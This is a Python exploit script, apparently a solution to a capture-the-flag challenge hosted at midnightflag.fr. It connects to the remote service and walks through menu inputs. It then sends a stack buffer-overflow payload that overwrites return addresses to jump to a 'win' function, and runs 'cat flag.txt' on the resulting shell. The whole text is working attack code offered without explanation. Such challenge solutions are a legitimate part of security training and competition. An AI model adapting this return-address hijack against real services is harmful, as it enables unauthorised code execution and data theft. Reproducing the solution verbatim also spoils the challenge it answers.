#!/usr/bin/env python3
import socket
import struct
import time

HOST = "dyn-03.midnightflag.fr"
PORT = 12771

WIN = 0x4012D6
RET_PLAY_TO_DORESET = 0x4013B9


def recv_some(sock: socket.socket, timeout: float = 0.2) -> bytes:
    sock.settimeout(timeout)
    data = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        except (TimeoutError, socket.timeout):
            break
    return data


def build_payload() -> bytes:
    payload = b"0\n"
    payload += b"A" * (0x38 - len(payload))
    payload += struct.pack("<Q", RET_PLAY_TO_DORESET)
    payload += b"B" * 8
    payload += struct.pack("<Q", WIN)
    return payload.ljust(0x80, b"Z")


def main() -> None:
    payload = build_payload()
    s = socket.create_connection((HOST, PORT), timeout=5)

    recv_some(s)
    s.sendall(b"USERUSERUSERUSER")
    time.sleep(0.03)
    recv_some(s)

    s.sendall(b"4\n")
    time.sleep(0.03)
    recv_some(s)

    # Single chunk after reset to avoid partial-read desync.
    s.sendall(b"RESETRESETRESET12" + b"1\n" + payload + b"0\n")
    time.sleep(0.08)
    print(recv_some(s, 0.5).decode("latin-1", "ignore"), end="")

    s.sendall(b"cat flag.txt\n")
    time.sleep(0.12)
    print(recv_some(s, 0.6).decode("latin-1", "ignore"), end="")

    s.sendall(b"exit\n")
    s.close()


if __name__ == "__main__":
    main()
